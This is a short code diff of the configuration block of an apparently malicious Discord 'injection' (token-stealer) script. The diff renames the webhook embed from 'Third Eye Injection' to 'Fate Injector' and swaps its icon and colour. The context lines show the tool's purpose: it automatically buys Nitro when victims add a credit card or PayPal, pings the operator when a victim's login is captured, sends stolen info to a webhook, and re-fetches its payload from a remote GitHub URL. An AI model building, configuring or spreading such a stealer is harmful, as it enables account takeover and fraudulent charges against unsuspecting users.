@@ -11,9 +11,9 @@ const config = {
   auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: 'Third Eye Injection', //name of the webhook thats gonna send the info
-  embed_icon: 'https://preview.redd.it/akjwr6etgpa61.jpg?width=640&crop=smart&auto=webp&s=ee3cb24da61e214e933d88fc5050afa778f18649'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
-  embed_color: 823, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
+  embed_name: 'Fate Injector', //name of the webhook thats gonna send the info
+  embed_icon: 'https://i.imgur.com/1XwQwEt.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_color: 39, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   injection_url: 'https://raw.githubusercontent.com/crxel/RdimoBetterInjection/main/injection.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
